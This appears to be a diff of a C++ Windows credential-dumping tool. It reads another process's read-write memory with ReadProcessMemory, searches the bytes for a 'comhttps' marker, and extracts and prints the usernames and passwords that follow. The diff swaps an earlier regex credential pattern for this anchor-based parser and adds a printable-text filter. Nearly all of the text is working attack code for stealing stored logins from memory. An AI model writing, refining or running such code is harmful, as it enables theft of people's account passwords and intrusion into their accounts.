@@ -17,46 +17,73 @@ void SetColor(WORD color) {
 
 
 
-// Extraction Logic based on the C# pattern
+// Helper to check if a string is actually readable text (or else it was showing a bunch of unreadable text - REGEX was complicated here as the file / memory is mostly binary and gibberish)
+bool IsValid(const std::string& str) {
+    if (str.length() < 3 || str.length() > 64) return false;
+    
+    for (char c : str) {
+        if ((unsigned char)c < 32 || (unsigned char)c > 126) return false;
+    }
+    
+    if (str.find("favicon") != std::string::npos || 
+        str.find("lifecycle") != std::string::npos ||
+        str.find("http") != std::string::npos ||
+        str[0] == '"' || str[0] == '{' || str[0] == '[') {
+        return false;
+    }
+    
+    return true;
+}
+
 void ScanMemoryRegions(HANDLE hProcess) {
     SetColor(14); std::wcout << L"[*] "; SetColor(7);
-    std::wcout << L"Scanning captured snapshot regions for credentials..." << std::endl;
+    std::wcout << L"Scanning regions for 'comhttps' anchor..." << std::endl;
 
     unsigned char* address = nullptr;
     MEMORY_BASIC_INFORMATION memInfo;
     std::set<std::string> seen;
 
-    std::regex credPattern(R"([a-zA-Z]https? ([a-zA-Z0-9\\-_\.@\?]{1,20}) ([a-zA-Z0-9#!@#\$%\^&\*\(\)_\-\+=\{\}\[\]:;<>\?/~\s]{1,40}))");
-
     while (VirtualQueryEx(hProcess, address, &memInfo, sizeof(memInfo)) != 0) {
-        if (memInfo.State == MEM_COMMIT && memInfo.Protect == PAGE_READWRITE) {
+        if (memInfo.State == MEM_COMMIT && (memInfo.Protect == PAGE_READWRITE)) {
             std::vector<char> buffer(memInfo.RegionSize);
             SIZE_T bytesRead;
 
             if (ReadProcessMemory(hProcess, memInfo.BaseAddress, buffer.data(), memInfo.RegionSize, &bytesRead)) {
-                std::string chunk;
-                chunk.reserve(bytesRead);
-                for (SIZE_T i = 0; i < bytesRead; ++i) {
-                    chunk += (buffer[i] == 0x00) ? ' ' : buffer[i];
-                }
+                std::string chunk(buffer.data(), bytesRead);
 
-                std::smatch match;
-                std::string::const_iterator searchStart(chunk.cbegin());
-                while (std::regex_search(searchStart, chunk.cend(), match, credPattern)) {
-                    std::string user = match[1].str();
-                    std::string pass = match[2].str();
+                size_t pos = 0;
+                while ((pos = chunk.find("comhttps", pos)) != std::string::npos) {
+                    size_t firstSpace = chunk.find_first_of(" \t\r\n\0", pos + 8);
                     
-                    // Filter out short junk or common false positives
-                    if (user.length() > 3 && pass.length() > 3) {
-                        std::string entry = user + " : " + pass;
-                        if (seen.find(entry) == seen.end()) {
-                            SetColor(10); std::cout << "[!] "; SetColor(7);
-                            std::cout << "Match Found: "; SetColor(15);
-                            std::cout << entry << std::endl;
-                            seen.insert(entry);
+                    if (firstSpace != std::string::npos) {
+                        size_t userStart = chunk.find_first_not_of(" \t\r\n\0", firstSpace);
+                        size_t userEnd = chunk.find_first_of(" \t\r\n\0", userStart);
+                        
+                        if (userStart != std::string::npos && userEnd != std::string::npos) {
+                            size_t passStart = chunk.find_first_not_of(" \t\r\n\0", userEnd);
+                            size_t passEnd = chunk.find_first_of(" \t\r\n\0", passStart);
+
+                            if (passStart != std::string::npos && passEnd != std::string::npos) {
+                                std::string user = chunk.substr(userStart, userEnd - userStart);
+                                std::string pass = chunk.substr(passStart, passEnd - passStart);
+
+                                if (IsValid(user) && IsValid(pass)) {
+                                    std::string entry = user + "|" + pass;
+                                    if (seen.find(entry) == seen.end()) {
+                                        seen.insert(entry);
+
+                                        std::cout << "------------------------------------------" << std::endl;
+                                        std::cout << "Username/eMail: "; SetColor(12); // RED
+                                        std::cout << user << std::endl; SetColor(7);
+                                        
+                                        std::cout << "Password:       "; SetColor(12); // RED
+                                        std::cout << pass << std::endl; SetColor(7);
+                                    }
+                                }
+                            }
                         }
                     }
-                    searchStart = match.suffix().first;
+                    pos += 8;
                 }
             }
         }
